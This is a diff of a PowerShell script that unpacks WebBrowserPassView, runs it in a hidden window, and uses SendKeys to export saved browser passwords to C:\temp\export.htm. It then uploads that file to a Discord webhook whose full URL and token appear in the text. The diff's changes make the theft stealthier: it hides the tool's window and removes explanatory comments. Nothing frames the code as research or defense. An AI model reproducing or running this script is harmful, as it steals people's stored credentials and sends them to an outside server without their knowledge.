@@ -33,11 +33,9 @@ $sevenZipPath = '.\7z\7za.exe'
 $extractionPassword = 'wbpv28821@'
 Start-Process -FilePath $sevenZipPath -ArgumentList "e", $wbpvZip, "-p$extractionPassword" -Wait
 
-
-
 Start-Sleep -Seconds 5
 
-Start-Process -FilePath '.\WebBrowserPassView.exe'
+Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden
 
 Add-Type -AssemblyName System.Windows.Forms
 
@@ -52,15 +50,13 @@ Start-Sleep -Seconds 3
 Start-Sleep -Seconds 1.7
 [System.Windows.Forms.SendKeys]::SendWait('%{F4}')  # ALT + F4
 
-
 $webhookUrl = 'https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX'
 $filePath = 'C:\temp\export.htm'
 
-# Introduce a delay before executing the upload
 Start-Sleep -Seconds 1.7
 
-# Upload the file to Discord using Invoke-RestMethod
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Form @{ file1 = Get-Item $filePath }
+$file = Get-Item $filePath
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Form @{ file1 = $file }
 
 Set-Location 'C:\temp'
 $tmpfolder = 'C:\temp'
